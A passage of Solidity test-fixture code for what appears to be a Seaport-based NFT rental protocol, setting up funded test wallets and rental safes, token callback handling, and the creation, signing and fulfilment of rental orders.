= factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n\n    interface ERC1155TokenReceiver {\n\n        function onERC1155Received(\n            address _operator,\n            address _from,\n            uint256 _id,\n            uint256 _value,\n            bytes calldata _data\n        ) external returns (bytes4);\n\n        function onERC1155BatchReceived(\n            address _operator,\n            address _from,\n            uint256[] calldata _ids,\n            uint256[] calldata _values,\n            bytes calldata _data\n        ) external returns (bytes4);\n    }\n\n    interface ERC721TokenReceiver {\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);\n    }\n\n    interface IERC165 {\n        function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    }\n\n\n    /**\n    * Borrowed from gnosis safe smart contracts\n    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.\n    * @author Richard Meissner - @rmeissner\n    */\n    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {\n        /**\n        * @notice Handles ERC1155 Token callback.\n        * return Standardized onERC1155Received return value.\n        */\n        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0xf23a6e61;\n        }\n\n        /**\n        * @notice Handles ERC1155 Token batch callback.\n        * return Standardized onERC1155BatchReceived return value.\n        */\n        function onERC1155BatchReceived(\n            address,\n            address,\n            uint256[] calldata,\n            uint256[] calldata,\n            bytes calldata\n        ) external pure override returns (bytes4) {\n            return 0xbc197c81;\n        }\n\n        /**\n        * @notice Handles ERC721 Token callback.\n        *  return Standardized onERC721Received return value.\n        */\n        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0x150b7a02;\n        }\n\n        /**\n        * @notice Handles ERC777 Token callback.\n        * return nothing (not standardized)\n        */\n        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {\n            // We implement this for completeness, doesn't really have any value\n        }\n\n        /**\n        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.\n        * @param interfaceId Id of the interface.\n        * @return if the interface is supported.\n        */\n        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n            return\n                interfaceId == type(ERC1155TokenReceiver).interfaceId ||\n                interfaceId == type(ERC721TokenReceiver).interfaceId ||\n                interfaceId == type(IERC165).interfaceId;\n        }\n\n    }\n\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    .withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            _createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    .offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    